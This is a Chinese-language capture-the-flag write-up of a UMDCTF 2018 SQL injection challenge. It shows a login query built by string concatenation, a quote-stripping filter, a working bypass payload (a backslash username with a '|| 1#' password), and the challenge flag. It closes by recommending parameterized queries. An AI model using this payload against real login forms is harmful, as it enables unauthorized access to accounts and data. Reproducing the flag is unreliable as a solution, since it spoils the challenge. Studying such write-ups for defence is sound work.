# UMDCTF 2018 - SQL Injection

## 题目简述

登录页面把用户名和密码直接拼进 MySQL 查询。程序虽然删除单双引号，并从密码中删除字符串 `or`，但没有使用参数化查询，仍可利用 MySQL 的反斜杠转义和逻辑运算符完成注入。

## 解题过程

服务端最终构造：

```php
SELECT * FROM users
WHERE username='$username'
AND password='$password'
```

过滤只执行：

```php
$username = str_replace("'", '', $username);
$password = str_replace("'", '', $password);
$password = str_ireplace("or", '', $password);
```

提交以下数据：

```text
username: \
password:  || 1#
```

拼接后的核心形式为：

```sql
WHERE username='\' AND password=' || 1#'
```

用户名中的反斜杠会转义原本用于闭合用户名的单引号，使后面的单引号承担新的闭合位置；`|| 1` 在该 MySQL 配置下等价于逻辑或真，`#` 注释掉末尾残余字符。查询因此返回 `users` 表中的全部记录。

仓库 `db.sql` 明确包含：

```sql
INSERT INTO `users`
VALUES ('flaggggg', 'L77t_5QL_HaX0r');
```

页面输出的题目 flag 为：

```text
L77t_5QL_HaX0r
```

仓库的 `description` 也将该原始字符串直接标为 flag，因此不额外添加 `UMDCTF-{...}` 包装。

## 方法总结

删除引号或关键字不是可靠的 SQL 注入防护，因为转义规则、注释和替代运算符仍会改变语句结构。正确修复方式是参数化查询；解题时则应先把过滤后的最终 SQL 完整写出，再根据目标数据库的词法规则构造输入。
